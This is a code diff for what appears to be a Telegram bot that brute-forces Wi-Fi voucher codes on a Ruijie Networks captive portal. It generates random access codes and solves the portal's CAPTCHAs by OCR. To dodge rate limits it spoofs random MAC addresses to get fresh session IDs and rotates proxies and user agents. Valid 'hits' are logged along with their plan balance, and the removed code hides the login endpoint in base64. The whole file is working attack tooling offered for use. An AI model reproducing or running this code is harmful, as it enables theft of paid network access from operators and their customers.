+        self._save_to_file()
+        return added, invalid
+
+    def _save_to_file(self):
+        try:
+            with open(self.file_path, "w") as f:
+                for p in self.proxies:
+                    f.write(p + "\n")
+        except OSError:
+            pass
+
+    async def get_next(self):
+        async with self.lock:
+            if not self.proxies:
+                return None
+            active = [p for p in self.proxies if self.fail_counts.get(p, 0) < self.MAX_FAILS]
+            if not active:
+                active = self.proxies
+            p = active[self.index % len(active)]
+            self.index += 1
+            return p
+
+    async def mark_bad(self, proxy):
+        if not proxy:
+            return
+        async with self.lock:
+            current_fails = self.fail_counts.get(proxy, 0) + 1
+            self.fail_counts[proxy] = current_fails
+            if current_fails < self.MAX_FAILS:
+                return
+            if proxy in self.proxies:
+                self.proxies = [p for p in self.proxies if p != proxy]
+                self.bad_proxies.append(proxy)
+                print(yellow + f"[ProxyManager] 💀 Banished after {current_fails} fails" + reset)
+                if len(self.bad_proxies) >= MAX_BAD_PROXIES:
+                    self._save_to_file()
+                    self.load()
+
+    def stats(self):
+        total = len(self.proxies) + len(self.bad_proxies)
+        bad = len(self.bad_proxies)
+        return total, bad
+
+    def get_active_count(self):
+        return len(self.proxies)
+
+
+def get_proxy_manager():
+    global _proxy_manager
+    if _proxy_manager is None:
+        _proxy_manager = ProxyManager(PROXY_FILE)
+    return _proxy_manager
+
+
+def create_connector_for_proxy(proxy):
+    if not proxy or not USE_PROXY:
+        return None
+    try:
+        if proxy.startswith(("socks4://", "socks5://")):
+            return ProxyConnector.from_url(proxy, rdns=True)
+        return ProxyConnector.from_url(proxy)
+    except Exception:
+        return None
+
+
+# ==============================================================================
+#  OCR
+# ==============================================================================
+
+def get_ocr_instance():
+    global _ocr_instance
+    if _ocr_instance is None:
+        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
+    return _ocr_instance
+
+
+def ocr_image_bytes_fast(image_bytes):
+    return get_ocr_instance().classification(image_bytes)
+
+
+async def solve_captcha_simple_async(session, captcha_url, headers):
+    try:
+        async with session.get(captcha_url, headers=headers,
+                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
+            if resp.status != 200:
+                return None
+            image_content = await resp.read()
+        if not image_content:
+            return None
+        text = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
+        if not text:
+            return None
+        return text.strip().upper()
+    except Exception:
+        return None
+
+
+# ==============================================================================
+#  USER DATA
+# ==============================================================================
+
+def get_user_data(user_id):
+    p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
+    if os.path.exists(p_file):
+        try:
+            with open(p_file) as f:
+                return f.read().strip()
+        except OSError:
+            pass
+    return None
+
+
+def generate_random_mac():
+    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
+    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))
+
 
 def replace_mac(url, new_mac):
-    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
-    return url
+    if "mac=" in url:
+        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
+    sep = "&" if "?" in url else "?"
+    return f"{url}{sep}mac={new_mac}"
 
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    global _connector
-    if not recheck:
-        current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id:
-            return
 
-    post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-    ).decode()
+def build_headers(referer=PORTAL_INDEX):
+    return {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json; charset=utf-8",
+        "user-agent": random.choice(USER_AGENTS),
+        "x-requested-with": "XMLHttpRequest",
+        "Origin": PORTAL_BASE,
+        "Referer": referer,
+    }
 
-    response = None
-    
-    for _attempt in range(3):
-        timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
-            session_id = await get_session_id(task_session, session_url, None)
-            if not session_id:
-                return
-            auth_code = None
-            for _ in range(8):
-                try:
-                    image = await Captcha_Image(task_session, session_id)
-                    text = await Captcha_Text(image)
-                    if not text:
-                        continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
-                    if verified:
-                        auth_code = text
-                        break
-                except Exception as e:
-                    print(f"[perform_check] captcha error: {e}")
-            if not auth_code:
-                return
-            if not recheck:
-                current_task = scan_tasks.get(chat_id)
-                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_code,
-            }
-            headers = {
-                "authority": "portal-as.ruijienetworks.com",
-                "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
-                "content-type": "application/json",
-                "origin": "https://portal-as.ruijienetworks.com",
-                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
-                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Geo) Chrome/139.0.0.0 Mobile Safari/537.36",
-            }
-            
-            proxy = None
-            
+
+# ==============================================================================
+#  GATEWAY / SESSION
+# ==============================================================================
+
+async def get_sid_from_gateway(session, portal_url, user_id):
+    mac = generate_random_mac()
+    url = replace_mac(portal_url, mac)
+    headers = {
+        "user-agent": random.choice(USER_AGENTS),
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    }
+    try:
+        async with session.get(url, headers=headers, allow_redirects=True,
+                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
+            final_url = str(resp.url)
             try:
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
-                    response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
-            except Exception as e:
-                print(f"[perform_check] error: {e}")
-                return
-        if response and 'request limited' in response:
-            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
-            continue
-        break
+                body = await resp.text()
+            except Exception:
+                body = ""
+        m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
+        if m:
+            return m.group(1), final_url
+        m = re.search(r"sessionId=([a-zA-Z0-9]+)", body)
+        if m:
+            return m.group(1), final_url
+        m = re.search(r"location\.href\s*=\s*[\'\"]([^\'\"]+)[\'\"]", body)
+        if m:
+            next_url = urljoin(final_url, m.group(1))
+            m2 = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", next_url)
+            if m2:
+                return m2.group(1), next_url
+        return None, final_url
+    except Exception:
+        return None, None
 
-    if not response:
+
+# ==============================================================================
+#  BALANCE
+# ==============================================================================
+
+async def fetch_balance(active_token, code, proxy):
+    if not active_token:
+        return "📐: N/A, ⏳: N/A"
+    connector = create_connector_for_proxy(proxy)
+    try:
+        async with aiohttp.ClientSession(connector=connector) as session:
+            url = f"{BALANCE_API}{active_token}"
+            headers = {
+                "accept": "application/json, text/javascript, */*; q=0.01",
+                "content-type": "application/json;",
+                "user-agent": random.choice(USER_AGENTS),
+                "x-requested-with": "XMLHttpRequest",
+                "Origin": PORTAL_BASE,
+                "Referer": PORTAL_BALANCE_PAGE + active_token,
+            }
+            async with session.get(url, headers=headers,
+                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
+                if resp.status != 200:
+                    return "📐: N/A, ⏳: N/A"
+                try:
+                    data = await resp.json(content_type=None)
+                except Exception:
+                    return "📐: N/A, ⏳: N/A"
+                res = data.get("result", {}) or data.get("data", {}) or {}
+                plan = res.get("profileName") or res.get("planName") or "Unknown"
+                remaining = res.get("remainingMinutes")
+                if remaining is not None:
+                    remaining = int(remaining)
+                    if remaining >= 0:
+                        hh, mm = divmod(remaining, 60)
+                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
+                    else:
+                        time_str = f"Expired ({remaining} mins)"
+                    return f"📐: {plan}, ⏳: {time_str}"
+                total = res.get("totalMinutes") or res.get("totalTime")
+                if total is not None:
+                    hh, mm = divmod(int(total), 60)
+                    time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
+                    return f"📐: {plan}, ⏳: {time_str}"
+                return f"📐: {plan}, ⏳: N/A"
+    except Exception:
+        return "📐: N/A, ⏳: N/A"
+    finally:
+        if connector is not None:
+            try:
+                await connector.close()
+            except Exception:
+                pass
+
+
+async def check_balance(active_token, code, user_id, proxy_str):
+    try:
+        with open(FILE_PATH, "a") as f:
+            f.write(f"{code}\n")
+    except OSError:
+        pass
+    balance = await fetch_balance(active_token, code, proxy_str)
+    plan_name = "Unknown"
+    time_str = "N/A"
+    if balance and "📐:" in balance:
+        try:
+            parts = balance.replace("📐:", "").split(", ⏳:")
+            if len(parts) >= 2:
+                plan_name = parts[0].strip()
+                time_str = parts[1].strip()
+        except Exception:
+            pass
+    return plan_name, time_str
+
+
+# ==============================================================================
+#  CORE CHECKER
+# ==============================================================================
+
+async def check_single_access_code(session, code, current_session_id,
+                                   login_url, captcha_base_url, verify_url,
+                                   headers, user_id, current_proxy):
+    if not current_session_id:
+        return "net"
+    try:
+        captcha_url = f"{CAPTCHA_IMAGE_URL}?sessionId={current_session_id}&_t={int(time.time() * 1000)}"
+        captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
+        if not captcha_text:
+            return "net"
+
+        v_payload = {"sessionId": current_session_id, "authCode": captcha_text}
+        v_headers = {
+            "content-type": "application/json",
+            "user-agent": random.choice(USER_AGENTS),
+            "Origin": PORTAL_BASE,
+            "Referer": PORTAL_INDEX,
+        }
+        async with session.post(verify_url, json=v_payload, headers=v_headers,
+                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as v_resp:
+            v_body = await v_resp.text()
+
+        verified = False
+        try:
+            v_json = json.loads(v_body)
+            if v_json.get("success") is True:
+                verified = True
+        except Exception:
+            if '"success":true' in v_body.replace(" ", ""):
+                verified = True
+        if not verified:
+            return "captcha"
+
+        l_payload = {
+            "accessCode": code,
+            "sessionId": current_session_id,
+            "apiVersion": 1,
+            "authCode": captcha_text,
+        }
+        async with session.post(login_url, json=l_payload, headers=v_headers,
+                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as l_resp:
+            body = await l_resp.text()
+
+        body_nospace = body.replace(" ", "")
+        if '"success":true' in body_nospace:
+            return "hit"
+
+        low = body.lower()
+        if "request limited" in low or "exceeds the limit" in low or "limited" in low:
+            return "limit"
+        return "bad"
+    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
+        return "net"
+    except asyncio.CancelledError:
+        raise
+    except Exception:
+        return "net"
+
+
+# ==============================================================================
+#  ⚡ OPTIMIZED CODE GENERATOR
+# ==============================================================================
+
+def make_code(mode, start_digit=6, counter=None):
+    if mode == "custom" and counter is not None:
+        return str(counter).zfill(6)
+
+    if mode == "num6":
+        return "".join(random.choices(_CHARSET_DIGITS_T, k=6))
+    if mode == "num7":
+        return "".join(random.choices(_CHARSET_DIGITS_T, k=7))
+    if mode == "num8":
+        return "".join(random.choices(_CHARSET_DIGITS_T, k=8))
+    if mode == "num9":
+        return "".join(random.choices(_CHARSET_DIGITS_T, k=9))
+
+    if mode == "eng6":
+        return "".join(random.choices(_CHARSET_ABC_T, k=6))
+    if mode == "eng7":
+        return "".join(random.choices(_CHARSET_ABC_T, k=7))
+    if mode == "eng8":
+        return "".join(random.choices(_CHARSET_ABC_T, k=8))
+
+    if mode == "mix6":
+        return "".join(random.choices(_CHARSET_MIX_T, k=6))
+    if mode == "mix7":
+        return "".join(random.choices(_CHARSET_MIX_T, k=7))
+    if mode == "mix8":
+        return "".join(random.choices(_CHARSET_MIX_T, k=8))
+
+    if mode == "abc6":
+        return "".join(random.choices(_CHARSET_ABC_T, k=6))
+
+    return "".join(random.choices(_CHARSET_DIGITS_T, k=6))
+
+
+# ==============================================================================
+#  WORKER
+# ==============================================================================
+
+async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
+    pm = get_proxy_manager()
+    state = user_scanners.get(user_id)
+    if state is None:
+        return
+    stop_event = state["stop_event"]
+    mode = state.get("mode", "num6")
+    start_digit = state.get("start_digit", 6)
+    tried_codes = state["tried_codes"]
+
+    while not stop_event.is_set():
+        proxy = await pm.get_next()
+        connector = create_connector_for_proxy(proxy)
+        session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
+            headers={"user-agent": random.choice(USER_AGENTS)},
+        )
+        try:
+            sid, _gateway = await get_sid_from_gateway(session, state["portal_url"], user_id)
+            if not sid:
+                state["net"] += 1
+                state["recent_logs"].append("⚠️ SID FAILED — RECONNECTING")
+                await pm.mark_bad(proxy)
+                await asyncio.sleep(0.05)
+                continue
+
+            codes_checked_this_sid = 0
+            sid_failures = 0
+            codes_checked_this_session = 0
+
+            while (codes_checked_this_session < MAX_CODES_PER_SESSION
+                   and codes_checked_this_sid < MAX_CODES_PER_SID
+                   and not stop_event.is_set()):
+
+                if len(tried_codes) > 500000:
+                    state["tried_codes"] = set()
+                    tried_codes = state["tried_codes"]
+
+                code = None
+                for _ in range(50):
+                    if mode == "custom":
+                        state["counter"] += 1
+                        code = make_code(mode, start_digit, state["counter"])
+                    else:
+                        code = make_code(mode, start_digit)
+                    if code not in tried_codes:
+                        break
+                if code is None:
+                    if mode == "custom":
+                        continue
+                    break
+                tried_codes.add(code)
+                state["current_code"] = code
+
+                result = await check_single_access_code(
+                    session, code, sid, login_url, captcha_base_url,
+                    verify_url, headers, user_id, proxy,
+                )
+                codes_checked_this_sid += 1
+                codes_checked_this_session += 1
+                state["tried"] += 1
+
+                if result == "hit":
+                    state["hits"] += 1
+                    state["hit_list"].append(code)
+                    state["last_hit"] = code
+                    state["recent_logs"].append(f"🔥 HIT: {code}")
+                    plan_name, time_str = await check_balance(sid, code, user_id, proxy)
+                    now = datetime.datetime.now()
+                    state["hit_details"].append({
+                        "code": code,
+                        "time": now,
+                        "plan": plan_name,
+                        "time_str": time_str,
+                    })
+                    break
+
+                elif result == "limit":
+                    state["limits"] += 1
+                    state["recent_logs"].append(f"⚠️ LIMIT EXCEEDED: {code}")
+                    break
+
+                elif result == "net":
+                    state["net"] += 1
+                    state["recent_logs"].append(f"❌ VOID / NET ERROR: {code}")
+                    sid_failures += 1
+                    if sid_failures >= 3:
+                        await pm.mark_bad(proxy)
+                        break
+
+                elif result == "captcha":
+                    state["failed"] += 1
+
+                else:
+                    state["failed"] += 1
+
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            state["net"] += 1
+            await pm.mark_bad(proxy)
+        finally:
+            try:
+                await session.close()
+            except Exception:
+                pass
+        if stop_event.is_set():
+            break
+        await asyncio.sleep(0.005)
+
+
+# ==============================================================================
+#  DASHBOARD
+# ==============================================================================
+
+async def live_dashboard_updater(context, user_id):
+    state = user_scanners.get(user_id)
+    if state is None:
+        return
+    stop_event = state["stop_event"]
+    dash_msg_id = state.get("dash_msg_id")
+    pm = get_proxy_manager()
+    try:
+        while not stop_event.is_set():
+            await asyncio.sleep(5)
+            if stop_event.is_set():
+                break
+            elapsed = max(time.time() - state["start_time"], 1)
+            speed_cpm = int(state["tried"] / elapsed * 60)
+            total, bad = pm.stats()
+            active = total - bad
+            recent_logs = state["recent_logs"][-5:]
+            last_log = recent_logs[-1] if recent_logs else "No Activity"
+
+            hit_lines = []
+            for hd in state.get("hit_details", []):
+                hit_lines.append(
+                    f"⚔️ `{hd['code']}`  •  {hd.get('plan', 'Unknown')}  •  {hd.get('time_str', 'N/A')}"
+                )
+
+            total_hits = state.get("hits", 0)
+            if hit_lines:
+                max_show = 90
+                if len(hit_lines) > max_show:
+                    hidden = len(hit_lines) - max_show
+                    hit_lines_display = [f"... ({hidden} hidden in ) ..."] + hit_lines[-max_show:]
+                else:
+                    hit_lines_display = hit_lines
+                hit_section = (
+                    f"🔨 * HITS  •  {total_hits}**\n"
+                    "╭────────────────────╮\n"
+                    + "\n".join(hit_lines_display) + "\n"
+                    "╰────────────────────╯"
+                )
+            else:
+                hit_section = (
+                    f"🔨 ** HITS  •  {total_hits}**\n"
+                    "╭────────────────────╮\n"
+                    "│  🖤 No vouchers yet\n"
+                    "╰────────────────────╯"
+                )
+
+            text = (
+                "⚔️ **Thank You For Use** ⚔️\n"
+                "❄️ @mzw199761 ❄️\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"⏰TIME: {state['tried']:,}\n"
+                f"🔥Hits: {state['hits']}\n"
+                f"⚠️ Limits: {state['limits']}\n"
+                f"❌ Net Errors: {state['net']}\n"
+                f"⚡ Speed: {speed_cpm:,} c/m\n"
+                f"📶 Active : {active}\n"
+                f"🗡️ Last Hit: `{state['last_hit'] or '—'}`\n"
+                f"📊 Current Code: `{state['current_code'] or '—'}`\n"
+                f"⌛ Whispers: {last_log}\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"{hit_section}\n"
+                "━━━━━━━━━━━━━━━━━━━━━━"
+            )
+
+            markup = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛑 STOP • ⚡", callback_data="stop_scan")]
+            ])
+
+            try:
+                await context.bot.edit_message_text(
+                    chat_id=user_id, message_id=dash_msg_id,
+                    text=text, parse_mode=ParseMode.MARKDOWN,
+                    reply_markup=markup)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    pass
+    except asyncio.CancelledError:
+        raise
+
+
+async def live_dashboard_updater_final(context, user_id, state):
+    pm = get_proxy_manager()
+    total, bad = pm.stats()
+    active = total - bad
+    elapsed = max(time.time() - state["start_time"], 1)
+    speed_cpm = int(state["tried"] / elapsed * 60)
+
+    hit_lines = []
+    for hd in state.get("hit_details", []):
+        hit_lines.append(
+            f" `{hd['code']}` ❤️: {hd.get('plan', 'Unknown')}, ⏰ : {hd.get('time_str', 'N/A')}"
+        )
+
+    total_hits = state.get("hits", 0)
+    if hit_lines:
+        hit_section = (
+            f"🔨 **HITS  •  {total_hits}**\n"
+            "╭────────────────────╮\n"
+            + "\n".join(hit_lines) + "\n"
+            "╰────────────────────╯"
+        )
+    else:
+        hit_section = (
+            f"🔨 ** HITS  •  {total_hits}**\n"
+            "╭────────────────────╮\n"
+            "│  🖤 No  vouchers  yet\n"
+            "╰────────────────────╯"
+        )
+
+    final_text = (
+        "💀 **Thank You For Use** 💀\n"
+        "❄️ @mzw199761 ❄️\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏰ Time: {state['tried']:,}\n"
+        f"🔥 Hits: {state['hits']}\n"
+        f"⚠️ Limits: {state['limits']}\n"
+        f"❌ Net Errors: {state['net']}\n"
+        f"⚡  Speed: {speed_cpm:,} c/m\n"
+        f"📊 Active Thralls: {active}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{hit_section}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
+    )
+
+    markup = InlineKeyboardMarkup([
+        [InlineKeyboardButton("‹ 🔁 RETURN  ›", callback_data="btn_back_main")]
+    ])
+
+    try:
+        await context.bot.edit_message_text(
+            chat_id=user_id, message_id=state["dash_msg_id"],
+            text=final_text, parse_mode=ParseMode.MARKDOWN,
+            reply_markup=markup)
+    except Exception:
+        pass
+
+
+# ==============================================================================
+#  RUN SCANNER
+# ==============================================================================
+
+async def run_user_scanner(context, user_id):
+    if user_scanners.get(user_id, {}).get("running"):
+        return
+    portal_url = get_user_data(user_id) or PORTAL_INDEX
+
+    state = {
+        "running": True,
+        "context": context,
+        "user_id": user_id,
+        "live_hit_msg_id": None,
+        "portal_url": portal_url,
+        "mode": context.user_data.get("selected_mode", "num6"),
+        "start_digit": context.user_data.get("start_digit", 6),
+        "counter": int(context.user_data.get("start_digit", 6)) * 100000,
+        "stop_event": asyncio.Event(),
+        "tried": 0, "hits": 0, "limits": 0, "net": 0, "failed": 0,
+        "hit_list": [], "valid_codes": [], "tried_codes": set(),
+        "recent_logs": [], "last_hit": None, "current_code": None,
+        "start_time": time.time(),
+        "hit_details": [],
+    }
+    user_scanners[user_id] = state
+
+    pm = get_proxy_manager()
+    active_count = pm.get_active_count()
+
+    if active_count <= 0:
+        await context.bot.send_message(
+            chat_id=user_id,
+            text="⚠️ **No  Proxies Found in the Abyss!**\n\n"
+                 "🕸️ **Send proxy list to unleash the  spell.**\n\n"
+                 "Press ➕ Add Proxies button to add proxies.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+        state["running"] = False
         return
 
-    if 'logonUrl' in response:
-        if recheck:
-            return code
+    dash = await context.bot.send_message(
+        chat_id=user_id,
+        text="🔮 Awakening  ritual dashboard...")
+    state["dash_msg_id"] = dash.message_id
 
-        if chat_id not in success_texts:
-            success_texts[chat_id] = []
+    headers = build_headers()
+    tasks = [asyncio.create_task(
+        worker(i, VOUCHER_URL, CAPTCHA_IMAGE_URL,
+               CAPTCHA_VERIFY_URL, headers, user_id))
+        for i in range(NUM_WORKERS)]
+    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
+    state["tasks"] = tasks
 
-        expire_date, raw_mins = await Code_Expires_Date(session_id)
-        
-        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
-        
-        if chat_id not in user_data:
-            user_data[chat_id] = {}
-        
-        current_display = user_data[chat_id].get('current_display_codes', [])
-        current_display.append(f"🎫 {code}\n   {expire_date}")
-        
-        code_line = "\n\n".join(current_display)
-        
-        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
-        
-        if message:
-            try:
-                if chat_id not in success_messages or len(code_line) > 4000:
-                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
-                    success_messages[chat_id] = sent.message_id
-                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
-                else:
-                    try:
-                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
-                        user_data[chat_id]['current_display_codes'] = current_display
-                    except Exception:
-                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
-                        success_messages[chat_id] = sent.message_id
-                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
-            except Exception as e:
-                print(f"Success Message Error: {e}")
-    elif 'STA' in response:
-        if chat_id not in limited_texts:
-            limited_texts[chat_id] = []
-        limited_texts[chat_id].append(code)
-        limited_line = "\n".join(limited_texts[chat_id])
-        if message:
-            try:
-                if chat_id not in limited_messages:
-                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Limited Codes:\n\n{limited_line}")
-                    limited_messages[chat_id] = sent.message_id
-                else:
-                    try:
-                        await bot.edit_message_text(chat_id=message.chat.id, message_id=limited_messages[chat_id], text=f"Limited Codes:\n\n{limited_line}")
-                    except Exception:
-                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Limited Codes:\n\n{limited_line}")
-                        limited_messages[chat_id] = sent.message_id
-            except Exception as e:
-                print(f"Limited Message Error: {e}")
-
-def Minute_to_Hour(total_minutes):
-    if total_minutes == 'Unknown':
-        return 'Unknown'
     try:
-        mins = int(total_minutes)
-        if mins == 0:
-            return "0m"
-        hours = mins // 60
-        rem_minutes = mins % 60
-        if hours > 0 and rem_minutes > 0:
-            return f"{hours}h {rem_minutes}m"
-        elif hours > 0:
-            return f"{hours}h"
-        else:
-            return f"{rem_minutes}m"
-    except:
-        return 'Unknown'
-
-def should_show_code(total_minutes):
-    if total_minutes == 'Unknown':
-        return True
-    try:
-        mins = int(total_minutes)
-        return mins == 0 or mins >= 1440
-    except:
-        return True
-
-async def Code_Expires_Date(active_id):
-    paths = [
-        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
-        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
-        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
-        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
-    ]
-    
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'content-type': 'application/json;',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-    
-    timeout = aiohttp.ClientTimeout(total=10)
-    async with aiohttp.ClientSession(
-        connector=_connector,
-        connector_owner=False,
-        cookie_jar=aiohttp.CookieJar(),
-        timeout=timeout
-    ) as fresh_session:
-        for url in paths:
-            try:
-                async with fresh_session.get(url, headers=headers) as req:
-                    if req.status == 200:
-                        respond = await req.json()
-                        if respond.get('success'):
-                            result = respond.get('result', {})
-                            raw_minutes = result.get('totalMinutes')
-                            if raw_minutes is None:
-                                raw_minutes = result.get('remainingMinutes')
-                            
-                            if raw_minutes is None:
-                                raw_minutes = 'Unknown'
-                                
-                            profile_name = result.get('profileName', 'Unknown')
-                            totaltime = Minute_to_Hour(raw_minutes)
-                            display = f"🃏 Plan: {profile_name} | ⏰ Time: {totaltime}"
-                            return display, raw_minutes
-            except Exception as e:
-                print(f"[Code_Expires_Date] path error: {e}")
-                continue
-                
-    return "🃏 Plan: Unknown | ⏰ Time: Unknown", 'Unknown'
-
-_ocr = ddddocr.DdddOcr(show_ad=False)
-
-def _ocr_sync(image_bytes):
-    nparr = np.frombuffer(image_bytes, np.uint8)
-    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-    if img is None:
-        return None
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    _, buffer = cv2.imencode('.png', thresh)
-    result = _ocr.classification(buffer.tobytes())
-    return result.upper()
-
-async def Captcha_Text(image_bytes):
-    return await asyncio.to_thread(_ocr_sync, image_bytes)
-
-async def Captcha_Image(session, session_id):
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'image',
-        'sec-fetch-mode': 'no-cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-    }
-    params = {
-        'sessionId': session_id,
-        '_t': str(time.time()),
-    }
-    
-    proxy = None
-    
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
-        return await req.read()
-
-async def Varify_Captcha(session, session_id, text):
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'content-type': 'application/json',
-        'origin': 'https://portal-as.ruijienetworks.com',
-        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-    }
-    json_data = {
-        'sessionId': session_id,
-        'authCode': text,
-    }
-    
-    proxy = None
-    
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
-        data = await req.json()
-        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
-        if data.get("success") == True:
-            return session_id
-        return None
-
-async def start_polling():
-    backoff = 5
-    while True:
-        try:
-            await bot.infinity_polling(timeout=20, request_timeout=20)
-            return
-        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
-            await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)
-        except Exception as e:
-            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
-            await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)
-
-async def main():
-    global session, _connector
-    timeout = aiohttp.ClientTimeout(total=30)
-    _connector = aiohttp.TCPConnector(
-        limit=20000,
-        limit_per_host=10000,
-        ttl_dns_cache=300,
-        ssl=False
-    )
